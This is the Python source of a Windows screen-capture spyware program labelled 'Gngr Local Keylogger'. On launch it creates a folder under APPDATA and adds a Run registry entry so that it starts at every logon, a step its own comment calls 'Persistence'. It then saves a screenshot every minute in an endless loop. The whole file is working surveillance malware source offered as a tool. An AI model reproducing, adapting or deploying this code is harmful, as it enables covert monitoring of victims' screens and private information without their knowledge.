############################################################################
#   
#   screen_log.py (Gngr Local Keylogger)
#   © 2021 ABDULKADİR GÜNGÖR All Rights Reserved
#   Contact email address: abdulkadir_gungor@outlook.com
#
#	Developper:	Abdulkadir GÜNGÖR (abdulkadir_gungor@outlook.com)
#	Date:	04/2021
#	All Rights Reserved (Tüm Hakları Saklıdır)
#
############################################################################

import os, time, winreg, pyautogui

def start_program():
    # Create directory
    try:
        directory_check = "{}\\Gngr-keylogger-v1.0\\".format(os.getenv('APPDATA'))
        res = os.path.isdir(directory_check)
        if not res:
            os.mkdir(directory_check)
    except:
        exit(0)

    # Persistence
    try:
        reg_path = r'Software\Microsoft\Windows\CurrentVersion\Run'
        reg_name = 'Gngr_screen_log'
        reg_value = "{}\\Gngr-keylogger-v1.0\\screen_log.exe".format(os.getenv('APPDATA'))
        #
        winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
        registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_WRITE)
        winreg.SetValueEx(registry_key, reg_name, 0, winreg.REG_SZ, reg_value)
        winreg.CloseKey(registry_key)
    except:
        pass


def start_screenlog():
    #
    path = "{}\\Gngr-keylogger-v1.0\\".format(os.getenv('APPDATA'))
    second = 60
    #
    while True:
        screenshot = pyautogui.screenshot()
        timestr = time.strftime("%Y-%m-%d__%H-%M-%S")
        fullpath = "{}\\{}__ScreenShot.png".format(path, timestr)
        screenshot.save(fullpath)
        time.sleep(second)

if __name__ == '__main__':
    start_program()
    start_screenlog()



